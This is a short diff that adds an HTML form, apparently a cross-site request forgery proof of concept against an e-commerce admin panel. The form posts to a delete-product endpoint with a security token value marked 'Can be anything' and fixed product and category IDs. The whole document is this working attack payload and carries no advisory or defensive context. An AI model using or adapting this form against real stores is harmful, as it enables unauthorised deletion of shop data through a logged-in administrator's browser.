@@ -1,0 +1,11 @@
+<form name="products" action="
+http://www.example.com/path_to_admin/product.php?action=delete_product_confirm";
+method="post">
+<label for="securityToken">Security Token</label><br/><input type="text"
+name="securityToken" value="Can be anything…" /><br/><br/>
+<label for="products_id">Products ID</label><br/><input type="text"
+name="products_id" value="329"><br/><br/>
+<label for="product_categories[]">Products Category</label><br/><input
+type="text" value="48" name="product_categories[]"><br/><br/>
+<input type="submit" border="0" alt="Delete" value=" Delete Product">
+</form>
